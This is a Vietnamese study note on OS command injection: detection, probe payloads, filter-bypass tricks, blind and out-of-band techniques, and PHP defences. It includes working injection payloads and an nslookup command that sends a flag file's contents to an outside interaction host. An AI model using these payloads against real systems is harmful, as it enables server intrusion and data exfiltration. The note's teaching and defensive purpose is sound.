# Khái niệm
- **Command Injection** là lỗ hổng cho phép kẻ tấn công thực thi các lệnh hệ trên máy chủ của trang web nhằm lấy cắp thông tin được lưu trên máy chủ này.

# Cách nhận biết
## 1. Có thể xem được source code
- Để ý, kiểm tra các `system()`, `exec()`, `shell_exec()`, `os.system()`

## 2. Không có source code
- Gửi payload đơn giản qua các input có dấu hiệu khả nghi (tìm những chỗ nhập tên, IP, domain,...):

```bash
; whoami
| whoami
&& whoami
```
- Hoặc khi bị chặn ký hiệu đặc biệt thì có thể encode nó để bypass được
- Xong rồi quan sát xem có kết quả gì trả về hay thay đổi gì bất thường trong response hay không

# Hướng khai thác
- Test input có bị kiểm soát không bằng các payload như:

`;id`, `&& whoami`, `| ls /`

- Thử lệnh đơn giản để dò kết quả:
    - Nếu thấy output → Non-blind → dễ khai thác
    - Nếu không thấy output → thử blind:
        Gửi lệnh có `sleep`, hoặc `ping`, `nslookup` để kiểm tra dựa trên thời gian hoặc kết nối ngoài
- Nếu các payloads trên bị chặn thì có thể thử bypass:
    - `<`: `cat</flag.txt`
    - `$IFS`: thay thế cho dấu cách ` `
    - `who''ami`, `w""hoami`
    - `who\am\i`
    - `$(): who$()ami`
    - `/fl*g` => `/flag`
    - `/flag?????` => `/flagABCDE`
    - `%09` = tab
    - `%0a` = `\n`
    - ...
# Phân loại
- **Non-blind OS Command Injection**: Kẻ tấn công thực hiện tấn công và kết quả trả về trực tiếp, dễ thấy, dễ khai thác

- **Blind Command Injection**: Kẻ tấn công thực thi các lệnh trên máy chủ nhưng kết quả của lệnh được chèn không hiển thị trực tiếp trong phản hồi HTTP, không thấy được output nên phải sử dụng các kỹ thuật để phán đoán, xác nhận
    - **Error-based Command Injection**: Kẻ tấn công dựa vào các thông báo lỗi để sửa đổi câu lệnh tấn công, hoặc khai thác chính thông tin có trong thông báo
    - **Time-based Command Injection**: Kẻ tấn công chèn các lệnh có khả năng gây chậm. Rồi xem thời gian phản hồi, họ có thể suy ra kết quả đúng hoặc sai của một điều kiện 
    Ví dụ: `if [ $(whoami) = 'www-data' ]; then sleep 10; fi`
    - **Out-of-band Command Injection**: Kẻ tấn công chèn lệnh có khả năng tương tác mạng đến với trang web, server bên ngoài mà họ kiểm soát để lấy được thông tin cần thiết
    Ví dụ: `nslookup $(cat /flag.txt).nntcryeccdyaydrczncjueom77dmwlf62.oast.fun`

# Cách phòng tránh
- Không đưa trực tiếp input của người dùng vào câu lệnh như: `system("ping " . $_GET["ip"]);`
- Dùng whilelist để hạn chế việc bị dùng các ký tự nhằm bypass: [a-z0-9A-Z]
- Cho người dùng quyền hạn thấp, chỉ đọc sửa nhưng file cần thiết
- trong PHP có thể sử dụng nhưng hàm như `escapeshellarg()`, `escapeshellcmd()` để có thể escape các ký tự đặc biệt
- Có thể vô hiệu quá các hàm trong `php.ini` nếu không cần thiết
`disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source`
